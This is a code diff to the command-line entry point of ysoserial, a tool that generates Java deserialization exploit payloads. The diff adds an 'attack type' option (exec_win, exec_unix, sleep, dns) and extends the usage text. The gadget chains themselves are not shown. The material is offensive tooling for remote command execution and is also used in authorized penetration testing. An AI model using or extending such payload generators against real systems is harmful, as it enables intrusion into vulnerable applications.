@@ -14,10 +14,17 @@ public class GeneratePayload {
 	private static final int USAGE_CODE = 64;
 
 	public static void main(final String[] args) {
-		if (args.length != 2) {
+		if (args.length < 2) {
 			printUsage();
 			System.exit(USAGE_CODE);
 		}
+		
+		// Default to exec_global, to maintain compatibility with script that requires ysoserial
+		String attackType = "exec_global";
+		if (args.length >= 3) {
+			attackType = args[2];
+		}
+		
 		final String payloadType = args[0];
 		final String command = args[1];
 
@@ -31,7 +38,7 @@ public class GeneratePayload {
 
 		try {
 			final ObjectPayload payload = payloadClass.newInstance();
-			final Object object = payload.getObject(command);
+			final Object object = payload.getObject(command, attackType);
 			PrintStream out = System.out;
 			Serializer.serialize(object, out);
 			ObjectPayload.Utils.releasePayload(payload, object);
@@ -45,7 +52,7 @@ public class GeneratePayload {
 
 	private static void printUsage() {
 		System.err.println("Y SO SERIAL?");
-		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
+		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' [attack_type]");
 		System.err.println("  Available payload types:");
 
 		final List<Class<? extends ObjectPayload>> payloadClasses =
@@ -68,5 +75,12 @@ public class GeneratePayload {
         for (String line : lines) {
             System.err.println("     " + line);
         }
+        
+        System.err.println("\tAvailable payload types:");
+		System.err.println("\t\texec_global");
+		System.err.println("\t\texec_win");
+		System.err.println("\t\texec_unix");
+		System.err.println("\t\tsleep");
+		System.err.println("\t\tdns");
     }
 }
